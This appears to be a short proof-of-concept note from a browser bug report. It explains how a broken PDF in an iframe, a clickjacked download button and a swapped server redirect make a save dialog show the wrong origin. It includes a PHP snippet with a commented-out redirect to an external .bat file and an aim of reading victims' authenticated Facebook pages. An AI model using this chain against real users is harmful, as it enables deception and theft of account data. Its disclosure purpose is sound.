PoCDL.html

Here is a little better PoC that uses PDF reader to create a download dialog displaying the wrong origin. 

You will need the following redir.php:
<?php
//header("Location: http://leucosite.com/a.bat");
header("Content-type: application/pdf");
header("Content-Disposition: inline; filename=p.pdf");
?>

Whats happening is we load an empty PDF which throws an error, this is important because the 'download pdf' button within the native pdf reader will re-request the pdf URL when downloading from a broken pdf. So, we load a pdf within an iframe and then we clickjack the download button but before that we make the php file that originally served the pdf now respond with a redirect.

A download dialog opens asking to save or open whilst showing the wrong origin. I'm using this to my benefit to have a user drag and drop this seemingly innocent file enabling us to read victims' facebook page with full auth.
